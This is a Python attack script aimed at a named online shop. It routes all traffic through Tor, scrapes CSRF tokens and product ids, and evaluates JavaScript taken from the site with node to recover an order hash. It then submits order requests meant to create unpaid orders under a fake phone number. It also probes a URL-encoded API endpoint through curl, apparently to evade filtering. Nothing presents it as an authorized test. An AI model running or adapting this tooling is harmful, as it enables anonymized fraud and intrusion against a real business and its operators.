#!/usr/bin/env python3
"""Find in-stock tid and try unpaid order; retry %61pi via curl torsocks."""
import json
import re
import subprocess
import time
from pathlib import Path

import requests

OUT = Path("/data/recon/hyqq99.com")
BASE = "https://hyqq99.com/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def main():
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Referer": BASE + "/",
            "Origin": "https://hyqq99.com",
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    home = s.get(BASE + "/", timeout=45)
    csrf = None
    m = re.search(r"csrf_token\s*=\s*[\"']([^\"']+)[\"']", home.text)
    if m:
        csrf = m.group(1)
    log("csrf", csrf)

    tids = sorted(set(re.findall(r"[?&]tid=(\d+)", home.text)), key=int)
    # sample spread
    sample = tids[:: max(1, len(tids) // 15)][:15]
    if "13" not in sample:
        sample = ["13"] + sample
    stock = []
    for tid in sample:
        r = s.get(BASE + f"/?mod=buy&tid={tid}", timeout=35)
        # leftcount ajax often works
        lc = s.get(
            BASE + f"/ajax.php?act=getleftcount&tid={tid}",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        sm = re.search(r"(库存|剩余)[^0-9]{0,12}(\d+)", r.text)
        price = re.findall(r"([\d]+\.[\d]{2})", r.text)[:4]
        title = (re.search(r"<title>([^<]+)", r.text) or [None, None])[1]
        row = {
            "tid": tid,
            "left": lc.text[:120],
            "stock_txt": sm.group(0) if sm else None,
            "prices": price,
            "title": (title or "")[:60],
        }
        stock.append(row)
        log("STOCK", row)
        time.sleep(0.3)
    (OUT / "dump" / "STOCK.json").write_text(
        json.dumps(stock, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    # try pay on first tid where left suggests stock
    for row in stock:
        left = row["left"]
        if '"num":0' in left or '"count":0' in left:
            continue
        if "不足" in left:
            continue
        tid = row["tid"]
        br = s.get(BASE + f"/?mod=buy&tid={tid}", timeout=35)
        hm = re.search(r"var hashsalt=(.+?);", br.text or "")
        hs = ""
        if hm:
            hs = subprocess.run(
                ["node", "-e", f"console.log({hm.group(1)})"],
                capture_output=True,
                text=True,
                timeout=10,
            ).stdout.strip()
        data = {"tid": tid, "inputvalue": "13800138000", "num": "1", "hashsalt": hs}
        if csrf:
            data["csrf_token"] = csrf
        pr = s.post(
            BASE + "/ajax.php?act=pay",
            data=data,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                **({"X-CSRF-TOKEN": csrf} if csrf else {}),
            },
            timeout=30,
        )
        log("PAYTRY", tid, pr.text[:300])
        if "trade_no" in pr.text or '"code":0' in pr.text:
            (OUT / "dump" / "ORDER.json").write_text(pr.text, encoding="utf-8")
            break

    # %61pi via curl+torsocks (sometimes more stable)
    for qs in [
        "act=search&id=1",
        "act=tools&key=",
        "act=tools&key=123456&limit=1",
        "act=site",
        "act=goodslist",
    ]:
        cmd = [
            "curl",
            "-sS",
            "-m",
            "20",
            "-x",
            "socks5h://127.0.0.1:9050",
            "-A",
            UA,
            "-H",
            "Origin: https://hyqq99.com",
            "-H",
            "Referer: https://hyqq99.com/shop/",
            f"{BASE}/%61pi.php?{qs}",
        ]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        log("CURL61", qs, p.stdout[:220] or p.stderr[:160])
    log("DONE")


if __name__ == "__main__":
    main()
